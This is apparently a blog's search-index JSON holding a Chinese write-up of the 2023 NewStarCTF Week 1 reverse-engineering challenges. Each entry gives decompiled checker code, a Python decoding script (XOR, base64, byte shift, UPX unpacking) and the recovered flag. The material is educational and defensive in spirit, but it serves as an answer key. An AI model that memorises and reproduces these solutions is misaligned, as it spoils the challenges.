","date":"2024-03-20","objectID":"/about/:0:0","tags":null,"title":"关于","uri":"/about/"},{"categories":null,"content":"'s friends","date":"2024-03-20","objectID":"/friends/","tags":null,"title":"友链","uri":"/friends/"},{"categories":["WP"],"content":"前段时间参加了NewStarCTF的比赛，赛制是每个礼拜上一周的新题。由于前段时间比较忙，所以没怎么看，现在空下来，来复现一下，同时提升自己的逆向能力 ","date":"2024-03-20","objectID":"/posts/89d59c3/:0:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r1 AndroXor使用 jadx 工具反编译 APK 文件，具体的代码包在 com.chick.androxor 中，且具体的加密代码如下 public String Xor(String str, String str2) { char[] cArr = {14, '\\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\\n', 2, '\\f', '\u003e', '(', '@', 11, '\\'', 'K', 'Y', 25, 'A', '\\r'}; char[] cArr2 = new char[str.length()]; String str3 = str.length() != 25 ? \"wrong!!!\" : \"you win!!!\"; for (int i = 0; i \u003c str.length(); i++) { char charAt = (char) (str.charAt(i) ^ str2.charAt(i % str2.length())); cArr2[i] = charAt; if (cArr[i] != charAt) { return \"wrong!!!\"; } } return str3; }但是他这里的输入，包含了明文的同时，还输入了一个 key 用于异或，所以找到哪里调用了这个 Xor 函数即可 在这个函数上右键查找用例，可以定位到调用该函数的具体位置，调用过程如下 Toast.makeText(mainActivity, mainActivity.Xor(obj, \"happyx3\"), 1).show();这里可以发现，key 就是这个 happyx3，所以解密脚本如下 flag = [14, '\\r', 17, 23, 2, 'K', 'I', '7', ' ', 30, 20, 'I', '\\n', 2, '\\f', '\u003e', '(', '@', 11, '\\'', 'K', 'Y', 25, 'A', '\\r'] key = 'happyx3' for i,v in enumerate(flag): if type(v) == str: v = ord(v) flag[i] = chr( v ^ ord(key[ i % len(key) ])) print(''.join(flag)) #flag{3z_And0r1d_X0r_x1x1}","date":"2024-03-20","objectID":"/posts/89d59c3/:1:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r2 easy_RE该题目有个 readme.txt，内容是 打开就有 使用 ida 打开该程序，定位到 main 函数，先看汇编，发现初始化的时候就赋值了明文的 flag 具体代码如下 v5[0] = 102; v5[1] = 108; v5[2] = 97; v5[3] = 103; v5[4] = 123; v5[5] = 119; v5[6] = 101; v5[7] = 49; v5[8] = 99; v5[9] = 48; v5[10] = 109; std::string::string(v7, \"e_to_rev3rse!!}\", \u0026v10);导出即可 flag{we1c0me_to_rev3rse!!}","date":"2024-03-20","objectID":"/posts/89d59c3/:2:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r3 ELF使用 ida 进行反编译后，就能得到主要代码 int __cdecl main(int argc, const char **argv, const char **envp) { unsigned int v3; // edx char *s1; // [rsp+0h] [rbp-20h] char *v6; // [rsp+8h] [rbp-18h] char *s; // [rsp+10h] [rbp-10h] s = (char *)malloc(0x64uLL); printf(\"Input flag: \"); fgets(s, 100, stdin); s[strcspn(s, \"\\n\")] = 0; v6 = (char *)encode(s); //第一次加密 v3 = strlen(v6); s1 = (char *)base64_encode(v6, v3); //第二次加密 if ( !strcmp(s1, \"VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t\") ) //加密后对比 puts(\"Correct\"); else puts(\"Wrong\"); free(v6); free(s1); free(s); return 0; }发现输入密文后进行了两次加密，一次是 encode(s)，第二次就是 base64_encode(v6,v3) 先看 base64_encode 函数 _BYTE *__fastcall base64_encode(__int64 a1, int a2) { int v3; // eax int v4; // eax int v5; // eax int v6; // eax int v7; // eax int v8; // eax int v9; // eax int v10; // eax int v11; // eax char v12[72]; // [rsp+10h] [rbp-70h] BYREF unsigned int v13; // [rsp+58h] [rbp-28h] int v14; // [rsp+5Ch] [rbp-24h] int v15; // [rsp+60h] [rbp-20h] int v16; // [rsp+64h] [rbp-1Ch] _BYTE *v17; // [rsp+68h] [rbp-18h] int v18; // [rsp+70h] [rbp-10h] int i; // [rsp+74h] [rbp-Ch] int v20; // [rsp+78h] [rbp-8h] int v21; // [rsp+7Ch] [rbp-4h] strcpy(v12, \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"); v18 = 4 * ((a2 + 2) / 3); v17 = malloc(v18 + 1); if ( !v17 ) return 0LL; v21 = 0; v20 = 0; while ( v21 \u003c a2 ) { v3 = v21++; v16 = *(unsigned __int8 *)(v3 + a1); if ( v21 \u003e= a2 ) { v5 = 0; } else { v4 = v21++; v5 = *(unsigned __int8 *)(v4 + a1); } v15 = v5; if ( v21 \u003e= a2 ) { v7 = 0; } else { v6 = v21++; v7 = *(unsigned __int8 *)(v6 + a1); } v14 = v7; v13 = (v15 \u003c\u003c 8) + (v16 \u003c\u003c 16) + v7; v8 = v20++; v17[v8] = v12[(v13 \u003e\u003e 18) \u0026 0x3F]; v9 = v20++; v17[v9] = v12[(v13 \u003e\u003e 12) \u0026 0x3F]; v10 = v20++; v17[v10] = v12[(v13 \u003e\u003e 6) \u0026 0x3F]; v11 = v20++; v17[v11] = v12[v13 \u0026 0x3F]; } for ( i = 0; (3 - a2 % 3) % 3 \u003e i; ++i ) v17[v18 - 1 - i] = 61; v17[v18] = 0; return v17; }这里就是正常的 base64 加密函数实现过程，并未发现替换表的行为，而且给的明文表就是原表 接下来看 encode 函数的实现过程 _BYTE *__fastcall encode(const char *a1) { size_t v1; // rax int v2; // eax _BYTE *v4; // [rsp+20h] [rbp-20h] int i; // [rsp+28h] [rbp-18h] int v6; // [rsp+2Ch] [rbp-14h] v1 = strlen(a1); v4 = malloc(2 * v1 + 1); v6 = 0; for ( i = 0; i \u003c strlen(a1); ++i ) { v2 = v6++; v4[v2] = (a1[i] ^ 0x20) + 16; } v4[v6] = 0; return v4; }输入明文后，该函数体对密文进行了 异或后位移 操作 了解了加密过程，下面就是解密脚本 from base64 import b64decode flag = \"VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t\" flag = list(b64decode(flag.encode())) for i,v in enumerate(flag): v = chr((v - 16) ^ 0x20) flag[i] = v print(''.join(flag)) #flag{D0_4ou_7now_wha7_ELF_1s?}","date":"2024-03-20","objectID":"/posts/89d59c3/:3:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r4 Endian题目主要代码如下 int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+4h] [rbp-3Ch] char *v5; // [rsp+8h] [rbp-38h] char v6[40]; // [rsp+10h] [rbp-30h] BYREF unsigned __int64 v7; // [rsp+38h] [rbp-8h] v7 = __readfsqword(0x28u); puts(\"please input your flag\"); __isoc99_scanf(\"%s\", v6); v5 = v6; for ( i = 0; i \u003c= 4; ++i ) { if ( *(_DWORD *)v5 != (array[i] ^ 0x12345678) ) { printf(\"wrong!\"); exit(0); } v5 += 4; } printf(\"you are right\"); return 0; }array 是存储 flag 的数字，但是是以小端序存储，每个空间存储了一段16进制，每个值都会去异或 0x12345678 ，解密脚本如下 flag = [0x75553A1E, 0x7B583A03, 0x4D58220C, 0x7B50383D, 0x736B3819] for i,v in enumerate(flag): flag[i] = bytes.fromhex(hex(v ^ 0x12345678)[2:])[::-1].decode(); print(''.join(flag)) #flag{llittl_Endian_a} #结尾手动补上 `}` 即可","date":"2024-03-20","objectID":"/posts/89d59c3/:4:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r5 EzPE使用 file 命令无法识别文件，用 010editor 查看发现不是标准的 exe 文件格式，所以手动修复文件头 修复后成功识别，主要代码如下 int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+2Ch] [rbp-4h] _main(argc, argv, envp); puts(\u0026draw); puts(\"Please enter your flag!\\n\"); scanf(\"%s\", input); for ( i = 0; i \u003c strlen(input) - 1; ++i ) input[i] ^= i ^ input[i + 1]; if ( !strcmp(input, data) ) puts(\"You Win!\"); else puts(\"You lose!\"); system(\"pause\"); return 0; }对明文逐个异或加密后，对比加密字符串 data ，所以提取 data 的内容后逐个异或即可，这里要注意的是解密的时候方向得从后往前，因为他异或的对象是未加密前的数据本身的后一位，这里最后一位数据是没被修改的 解密脚本如下 flag = [int(i,16) for i in \"0A 0C 04 1F 26 6C 43 2D 3C 0C 54 4C 24 25 11 06 05 3A 7C 51 38 1A 03 0D 01 36 1F 12 26 04 68 5D 3F 2D 37 2A 7D\".split(' ')] for i in range(len(flag) - 2,-1,-1): flag[i] ^= i ^ flag[i+1] print(bytearray(flag).decode()) #flag{Y0u_kn0w_what_1s_PE_File_F0rmat}","date":"2024-03-20","objectID":"/posts/89d59c3/:5:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r6 lazy_activtiy用 jadx 反编译，在包 com.droidlean.activity_travel 中有 FlagActivity 类，代码如下 public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.layout_2); final TextView textView = (TextView) findViewById(R.id.textView2); final EditText editText = (EditText) findViewById(R.id.editTextTextPersonName2); ((Button) findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() { // from class: com.droidlearn.activity_travel.FlagActivity.1 @Override // android.view.View.OnClickListener public void onClick(View view) { textView.setText(Integer.toString(FlagActivity.access$004(FlagActivity.this))); if (FlagActivity.this.cnt \u003e= 10000) { Toast.makeText(FlagActivity.this, editText.getText().toString(), 0).show(); } } }); }很明显，在页面创建的时候，会输出读取某个 editText 的内容并输出，但是这个页面并没有正常显示，被注释掉了，正常显示的是 MainActivity 的页面 在 AndroidManifest.xml 文件中可以发现这样一句 \u003cactivity android:name=\"com.droidlearn.activity_travel.FlagActivity\" android:exported=\"false\"/\u003e说明 FlagActivity 的页面被关闭了，但是输出的 flag 是通过读取页面上控件的值，所以我们直接所搜 flag{ 关键字即可 android:text=\"flag{Act1v1ty_!s_so00oo0o_Impor#an#}\"","date":"2024-03-20","objectID":"/posts/89d59c3/:6:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r7 Segments题目的文件名是 shift_f7 ，同时题目名是 Segments ，所以很明显了，用 ida 打开该文件，直接看 Segments 即可 根据语义输出即可 flag{You_ar3_g0od_at_f1nding_ELF_segments_name}","date":"2024-03-20","objectID":"/posts/89d59c3/:7:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"},{"categories":["WP"],"content":"\r8 咳查该文件，发现用 UPX 加了壳，使用命令脱壳即可 upx -d ke.exe去壳后用 ida 查看该文件，主要代码如下 int __cdecl main(int argc, const char **argv, const char **envp) { unsigned __int64 i; // r10 char *v4; // kr00_8 char Str1[96]; // [rsp+20h] [rbp-88h] BYREF int v7; // [rsp+80h] [rbp-28h] _main(); memset(Str1, 0, sizeof(Str1)); v7 = 0; Hello(); scanf(\"%s\", Str1); for ( i = 0i64; ; ++i ) { v4 = \u0026Str1[strlen(Str1)]; if ( i \u003e= v4 - Str1 ) break; ++Str1[i]; } if ( !strncmp(Str1, enc, v4 - Str1) ) puts(\"WOW!!\"); else puts(\"I believe you can do it!\"); system(\"pause\"); return 0; }加密过程是逐个加1，最后对比密文。解密脚本如下 flag = list(\"gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~\") for i,v in enumerate(flag): flag[i] = chr(ord(v)-1) print(''.join(flag)) #flag{C0ngratu1at10ns0nPa221ngTheF1rstPZGALAXY1eve1}","date":"2024-03-20","objectID":"/posts/89d59c3/:8:0","tags":["Reverse","WP"],"title":"2023NewStarCTF Week1 WP(Reverse)","uri":"/posts/89d59c3/"}]